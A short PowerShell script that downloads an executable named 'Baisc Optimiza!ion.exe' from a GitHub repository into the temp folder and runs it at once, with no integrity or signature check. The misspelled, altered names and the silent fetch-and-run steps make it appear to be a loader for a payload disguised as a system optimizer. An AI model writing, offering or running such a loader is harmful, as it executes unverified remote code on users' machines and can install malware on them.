$downloadUrl = "https://github.com/Apela999/Optimzation-/raw/refs/heads/main/Baisc%20Optimiza!ion.exe"
$tempFolder = [System.IO.Path]::GetTempPath()
$exeFile = Join-Path $tempFolder "BaiscOptimiza!ion.exe"

Invoke-WebRequest -Uri $downloadUrl -OutFile $exeFile

if (Test-Path $exeFile) {
    Start-Process -FilePath $exeFile -Wait
} else {
    Write-Host "Download failed. File not found at $exeFile"
}